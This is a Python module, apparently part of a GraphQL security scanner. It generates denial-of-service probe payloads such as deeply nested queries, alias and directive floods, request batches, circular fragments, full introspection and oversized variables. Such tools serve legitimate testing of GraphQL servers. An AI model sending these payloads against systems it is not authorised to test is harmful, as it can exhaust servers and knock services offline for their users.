"""GraphQL Denial of Service (DoS) attack vectors."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from enum import Enum, auto
from typing import Any

logger = logging.getLogger("gradientql.dos")


class DoSType(Enum):
    DEPTH_LIMIT = auto()
    FIELD_DUPLICATION = auto()
    ALIAS_OVERLOAD = auto()
    BATCH_ABUSE = auto()
    FRAGMENT_CIRCULAR = auto()
    INTROSPECTION_ABUSE = auto()
    COMPLEXITY_OVERFLOW = auto()
    VARIABLE_SIZE = auto()
    DIRECTIVE_OVERLOAD = auto()


@dataclass
class DoSResult:
    dos_type: DoSType
    vulnerable: bool
    query: str
    evidence: str
    response_time_ms: float | None = None
    error_message: str | None = None
    max_depth_tested: int | None = None
    fields_count: int | None = None


class GraphQLDoSTester:
    """Builds DoS probe queries, schema-aware where a schema map is supplied."""

    def __init__(self, schema_map: dict[str, Any] | None = None):
        self.schema_map = schema_map or {}

    def _get_recursive_type(self, type_name: str, depth: int = 0) -> str:
        """Build a nested selection `depth` levels deep over self-referential fields.

        Follows the first field whose return type references type_name to nest
        deeper; returns the bare "__typename" sentinel at depth 0 or when the
        type exposes no self-referential field to recurse through.
        """
        if depth == 0:
            return "__typename"

        type_fields = self.schema_map.get(type_name, {})
        recursive_fields = []
        
        for field_name, field_info in type_fields.items():
            if field_name.startswith("_"):
                continue
            return_type = field_info.get("return_type", "")
            if type_name in return_type:
                recursive_fields.append(field_name)
        
        if recursive_fields:
            field = recursive_fields[0]
            inner = self._get_recursive_type(type_name, depth - 1)
            return f"{field} {{ {inner} }}"
        
        return "__typename"
    
    def build_deep_query(self, max_depth: int = 50) -> tuple[str, int]:
        """Build a deeply nested query and return it with its actual depth.

        Prefers a genuinely recursive selection over a known self-referential
        type; falls back to a flat fan-out of aliased `__typename` fields when
        the schema exposes no such type.
        """
        query_type = self.schema_map.get("_query_type", "Query")

        for type_name in ["User", "Account", "Node", query_type]:
            if type_name in self.schema_map:
                nested = self._get_recursive_type(type_name, max_depth)
                if nested != "__typename":
                    query = f'query {{ {nested} }}'
                    return query, max_depth

        fields = []
        for i in range(max_depth):
            fields.append(f"level{i}: __typename")
        
        query = f'query {{ __typename { " ".join(fields)} }}'
        return query, max_depth
    
    def build_field_duplication_query(self, duplicate_count: int = 1000) -> str:
        aliases = [f"a{i}: __typename" for i in range(duplicate_count)]
        return f'query {{ { " ".join(aliases)} }}'
    
    def build_batch_query(self, count: int = 100) -> list[dict[str, Any]]:
        return [
            {"query": "{__typename}"}
            for _ in range(count)
        ]
    
    def build_fragment_circular_query(self) -> str:
        return '''
        query {
            __typename
            ...FragA
        }
        
        fragment FragA on Query {
            __typename
            ...FragB
        }
        
        fragment FragB on Query {
            __typename
            ...FragA
        }
        '''
    
    def build_introspection_abuse_query(self) -> str:
        return '''
        query IntrospectionAbuse {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    ...FullType
                }
                directives {
                    name
                    description
                    locations
                    args {
                        ...InputValue
                    }
                }
            }
        }
        
        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    ...InputValue
                }
                type {
                    ...TypeRef
                }
                isDeprecated
                deprecationReason
            }
            inputFields {
                ...InputValue
            }
            interfaces {
                ...TypeRef
            }
            enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
            }
            possibleTypes {
                ...TypeRef
            }
        }
        
        fragment InputValue on __InputValue {
            name
            description
            type {
                ...TypeRef
            }
            defaultValue
        }
        
        fragment TypeRef on __Type {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        '''
    
    def build_directive_overload_query(self, count: int = 100) -> str:
        directives = " ".join(["@skip(if: false)" for _ in range(count)])
        return f'query {{ __typename {directives} }}'
    
    def build_variable_size_query(self, size_kb: int = 100) -> tuple[str, dict]:
        large_string = "A" * (size_kb * 1024)
        query = 'query($input: String) { __typename }'
        variables = {"input": large_string}
        return query, variables
    
    def build_complexity_overflow_query(self) -> str:
        fragments = []
        for i in range(50):
            fragments.append(f'''
            fragment Frag{i} on Query {{
                __typename
                ...Frag{(i+1) % 50}
            }}
            ''')
        
        query = f'''
        query {{
            ...Frag0
        }}
        {''.join(fragments)}
        '''
        return query
    
    def get_all_dos_vectors(self) -> dict[DoSType, Any]:
        return {
            DoSType.DEPTH_LIMIT: self.build_deep_query(100),
            DoSType.FIELD_DUPLICATION: self.build_field_duplication_query(1000),
            DoSType.ALIAS_OVERLOAD: self.build_field_duplication_query(500),
            DoSType.BATCH_ABUSE: self.build_batch_query(100),
            DoSType.FRAGMENT_CIRCULAR: self.build_fragment_circular_query(),
            DoSType.INTROSPECTION_ABUSE: self.build_introspection_abuse_query(),
            DoSType.COMPLEXITY_OVERFLOW: self.build_complexity_overflow_query(),
            DoSType.DIRECTIVE_OVERLOAD: self.build_directive_overload_query(100),
            DoSType.VARIABLE_SIZE: self.build_variable_size_query(10),
        }


def generate_dos_payload(dos_type: DoSType, schema_map: dict | None = None) -> str | list | tuple:
    """Build the payload for one DoS vector.

    The return shape depends on the vector: a query string, a batch list, or a
    (query, extra) tuple. Unknown vectors fall back to a trivial `{__typename}`.
    """
    tester = GraphQLDoSTester(schema_map)
    
    generators = {
        DoSType.DEPTH_LIMIT: lambda: tester.build_deep_query(100),
        DoSType.FIELD_DUPLICATION: lambda: tester.build_field_duplication_query(1000),
        DoSType.ALIAS_OVERLOAD: lambda: tester.build_field_duplication_query(500),
        DoSType.BATCH_ABUSE: lambda: tester.build_batch_query(100),
        DoSType.FRAGMENT_CIRCULAR: tester.build_fragment_circular_query,
        DoSType.INTROSPECTION_ABUSE: tester.build_introspection_abuse_query,
        DoSType.COMPLEXITY_OVERFLOW: tester.build_complexity_overflow_query,
        DoSType.DIRECTIVE_OVERLOAD: lambda: tester.build_directive_overload_query(100),
        DoSType.VARIABLE_SIZE: lambda: tester.build_variable_size_query(10),
    }
    
    generator = generators.get(dos_type)
    if generator:
        return generator()
    return "{__typename}"
